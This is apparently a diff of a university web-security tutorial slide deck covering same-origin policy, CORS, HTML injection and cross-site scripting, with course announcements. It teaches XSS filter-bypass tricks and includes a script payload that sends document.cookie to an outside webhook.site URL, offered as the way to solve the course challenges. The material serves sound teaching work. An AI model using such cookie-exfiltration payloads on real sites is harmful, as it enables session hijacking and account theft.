@@ -4,13 +4,14 @@ layout: "bundle"
 outputs: ["Reveal"]
 ---
 
-## We'll get started at 18:05
+## We'll get started at 5 past
 
 ---
 
 {{< slide class="center" >}}
 # Week07
 ### COMP6443 H18A 
+Cross Site Scripting (XSS)
 
 ---
 
@@ -18,15 +19,16 @@ outputs: ["Reveal"]
 {{% section %}}
 
 ## Due Dates
-* Most of the Topic04 challenges should be out
+* Some of the XSS related challenges are out now. Some are broken.... thanks @melon
 * These are due Week08 Sunday @ 11:59pm
 
 ---
 
 ## Report groups
-* The second report is out
-* If you need a new group for the 2nd report, msg me.
+* The second report is coming soon (I think)
+* Same groups! But with feedback ;) 
 * Marks/feedback will be out at some point
+> (But I marked your reports if you want some feedback today shh...)
 
 {{% /section %}}
 
@@ -41,6 +43,8 @@ outputs: ["Reveal"]
 origin = <span style="color: #021691">scheme</span> + <span style="color: #fffacd">host</span> + <span style="color: #7FFFD4">port</span>
 {{% /fragment %}}
 
+* This is where some request came from! (Or did it)
+
 ---
 
 ## Origin vs Site
@@ -53,18 +57,44 @@ site = <span style="color: #fffacd">private_domain</span> + <span style="color: 
 * <s><span style="color: #021691">scheme</span>, <span style="color: #A52A2A">subdomain</span> and <span style="color: #7FFFD4">port</span></s>
 {{% /fragment %}}
 
+* COMPLETELY DIFFERENT WEBSITE!
+
+---
+
+So what are some restrictions on these Sites and Origins?
+
 ---
 
 {{% section %}}
 
 ## SOP (Same Origin Policy)
-* Blocks resource requests to/from an *external* site
+* Browser feature! (1995)
+
+* Restricts getting resources to/from an *external* site
+> If you request something from another website, Same Origin Policy says that you cant access any of the resources because its only accessible on the same origin!
 
 * "*External*" is based on *SOP*: only requests from the same `origin` are allowed to use the resources
 
-* more secure ~~*but how people bypassed it isn't xd*~~
-
 > read more [here](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
+
+---
+
+## Why is this good?
+
+* Basically you used to be able to just send a request to a website and randomly access everything about that website.
+- Javascript running
+- Sending requests
+- Setting cookies
+
+> Old days of the interwebs.
+
+---
+
+But Jesse if we block all these requests to resources how do we get our [cute cat photos](https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIzLTA5L3Jhd3BpeGVsX29mZmljZV8zNF9mbHVmZnlfY2h1YmJ5X3Bhc3RlbF9jYXRzX2thd2FpaV9hZXN0aGV0aWNfM182YTJkZjRmNS03NTZiLTQyODgtOWQ4Mi1lZmRlMmE1MTA2OWRfMS5qcGc.jpg)?
+
+> CORS
+
+Who has heard of this?
 
 ---
 
@@ -73,7 +103,12 @@ site = <span style="color: #fffacd">private_domain</span> + <span style="color: 
 
 * This can be achieved if the resource owner sets certain headers on the resource ([more here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers))
 
-> [give it a try](https://www.test-cors.org/)
+For example:
+
+This lets any origin load the resource 
+```
+Access-Control-Allow-Origin: *
+```
 
 ---
 
@@ -84,53 +119,17 @@ site = <span style="color: #fffacd">private_domain</span> + <span style="color: 
 
 ---
 
-### JSONP
-* What did people do before CORS was available?
+### This is confusing I KNOW
 
-* JSON with Padding
-    * You can't load a resource from another domain (but you can load a script).
+So SOP prevents us from loading resources.
+CORS allows specific origins to load specific resources.
 
-    * So, return a script which loads the content? :brain:
+For example, if I clicked someones malicious link, because of SOP, if the malicious website 
+sent a request to `Bank.com`, the request would be blocked!
 
----
-
-### How 2 JSONP
-* How do you load the content? You run a function which takes the data as an argument.
-
-* Since we're loading the data, we define what function is being used to load it.
-
----
-
-### JSONP Example
-* Define the function using a `callback` parameter
-```html
-<!-- https://melon.com/numbers?callback=load_data -->
-load_data([1, 2, 3, 4, 5])
-```
-
-&nbsp;
-
-* The script below will invoke `load_data([...])`
-```html
-<script src="https://melon.com/numbers?callback=load_data"></script>
-```
-
----
-
-### JSONP Demo
+> IM SAFE!
 
 {{% /section %}}
-
----
-
-### Cookies (SameSite)
-* *None*: {{% fragment %}}Cookies are always sent{{% /fragment %}}
-* *Lax*: {{% fragment %}} (default) not sent cross-site{{% /fragment %}}
-    * images/iframes {{% fragment %}}*`no`*{{% /fragment %}}
-    * navigation (GET)    {{% fragment %}}*`yes`*{{% /fragment %}}
-* *Strict*: {{% fragment %}}Cookies aren't sent{{% /fragment %}}
-
-> read more [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
 
 ---
 
@@ -143,20 +142,35 @@ load_data([1, 2, 3, 4, 5])
 
 {{% section %}}
 
-## HTML injection
-* Browsers just render the DOM
+---
+## HTML?
+
+Html is basically just a bunch of tags that look like this: 
+
+```html
+<div>
+    <p>stuff</p>
+</div>
+```
+
+We have seen this alot in our developer tools!
+The `elements` part of the devtools is called the DOM!
+
+---
+### HTML injection
+* Browsers just render the DOM (HTML ELEMENTS)
 * How would it know if tags are user-supplied or server-supplied
 * what if our input was just `<s>`?
 
 ---
 
-> Cool graphic?
+## DEMO
 
 ---
 
 ### Know your tags
 * Some are paired `<div></div>`
-* Some aren't `<img src=.../>`
+* Some can be unpaired `<img src=.../>`
 * what goes in here? `<script>...</script>`
 
 {{% /section %}}
@@ -166,10 +180,10 @@ load_data([1, 2, 3, 4, 5])
 {{% section %}}
 
 ### XSS (Cross-site scripting)
-
-* another 'mixing of data and control' issue
-    * your browser only receives a single stream of data
-    * the content of the stream determines if it's control or data
+* Not technically "cross-site"
+* Think of it as "Javascript Injection"
+* Your browser can take in inputs and place them inside the DOM (html elements)
+    * If you do this insecurely you can execute arbitrary javascript
 * Tricking a **browser** into executing your code
 
 ---
@@ -193,11 +207,12 @@ load_data([1, 2, 3, 4, 5])
 
 ### DOM-based XSS
 * Similar to the others, but the vulnerability comes from modifying the DOM
+* document is basically like a global variable that lets you modify/view all the elements in the dom
 
 ```html
 <script>
-const pos=document.URL.indexOf("context=")+8;
-document.write(document.URL.substring(pos,document.URL.length));
+const pos=document.URL.indexOf("context=")+8; 
+document.write(document.URL.substring(pos,document.URL.length)); 
 </script>
 ```
 
@@ -207,10 +222,16 @@ document.write(document.URL.substring(pos,document.URL.length));
 
 ---
 
+* Reflected
+* Stored
+* Dom Based
+
+---
+
 ### XSS isn't just `<script>` tags
 ```javascript
 // event-handlers
-<img src=x onerror=alert(1)/>
+<img src=x onerror="alert(1)"/>
  
 // injecting into javascript code
 const a = '<user_input>'
@@ -236,13 +257,44 @@ const a = '<user_input>'
 
 ### Bonus: breaking mitigations
 * Content stripped/blocked
+    * different tag `<img onerror=...>` !!IMPORTANT!!
+    * different event handler `<body onload=...>` !!IMPORTANT!!
     * embed dummy characters: `<SCRscriptIPT>`
     * use alternating case: `<ScRiPt>`
-    * different tag `<img onerror=...>`
-    * different event handler `<body onload=...>`
-
+    
 > [here's a couple more](https://github.com/payloadbox/xss-payload-list)
 
+
+---
+
+{{% section %}}
+
+How do you solve these challenges?
+
+> requestbin/webhooks
+
+```javascript
+<script>fetch("https://webhook.site/dba43b3c-1c05-4de5-b49f-376261fee98e?"+ document.cookie)</script>
+```
+
+---
+
+> MY COOKIES!!! 
+
+Oh well.
+
+---
+### Cookies (SameSite)
+* *None*: {{% fragment %}}Cookies are always sent{{% /fragment %}}
+* *Lax*: {{% fragment %}} (default) not sent cross-site{{% /fragment %}}
+    * images/iframes {{% fragment %}}*`no`*{{% /fragment %}}
+    * navigation (GET)    {{% fragment %}}*`yes`*{{% /fragment %}}
+* *Strict*: {{% fragment %}}Cookies aren't sent{{% /fragment %}}
+
+> read more [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
+
+
+{{% /section %}}
 ---
 
 ## CSRF
